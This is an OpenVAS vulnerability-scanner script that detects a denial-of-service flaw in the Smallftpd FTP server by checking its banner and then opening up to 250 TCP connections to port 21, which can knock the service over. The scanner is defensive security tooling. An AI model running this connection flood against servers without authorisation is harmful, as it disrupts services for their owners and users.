###############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_smallftpd_mult_requests_dos_vuln.nasl 13 2013-10-27 12:16:33Z jan $
#
# Smallftpd FTP Server Multiple Requests Denial of Service Vulnerability
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2011 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow unauthenticated attackers to cause a
  denial of service.
  Impact Level: Application";
tag_affected = "Smallftpd version 1.0.3-fix and prior.";
tag_insight = "The flaw is due to an error when handling the multiple requests
  from the client. It is unable to handle multiple connections regardless
  of its maximum connection settings.";
tag_solution = "No solution or patch is available as of 28th June, 2011. Information
  regarding this issue will updated once the solution details are available.
  For updates refer to http://smallftpd.sourceforge.net/";
tag_summary = "The host is running Smallftpd FTP Server and is prone to denial of service
  vulnerability.";

if(description)
{
  script_id(902453);
  script_version("$Revision: 13 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:16:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2011-07-01 16:09:45 +0200 (Fri, 01 Jul 2011)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"risk_factor", value:"High");
  script_name("Smallftpd FTP Server Multiple Requests Denial of Service Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://www.1337day.com/exploits/16423");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/17455/");

  script_description(desc);
  script_summary("Determine if Smallftpd is prone to denial of service vulnerability");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (c) 2011 SecPod");
  script_family("FTP");
  script_require_ports("Services/ftp", 21);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}

##
## The script code starts here
##

include("ftp_func.inc");

ftpPort = get_kb_item("Services/ftp");
if(!ftpPort){
  ftpPort = 21;
}

## check port status
if(!get_port_state(ftpPort)){
  exit(0);
}

## Confirm the Application installed
banner = get_ftp_banner(port:ftpPort);
if("220- smallftpd" >!< banner){
  exit(0);
}

## Open the multiple sockets on port 21. if it fails exit
for(i=0; i<250; i++)
{
  soc = open_sock_tcp(ftpPort);
  if(!soc)
  {
    security_hole(0);
    exit(0);
  }
}

ftp_close(socket:soc);
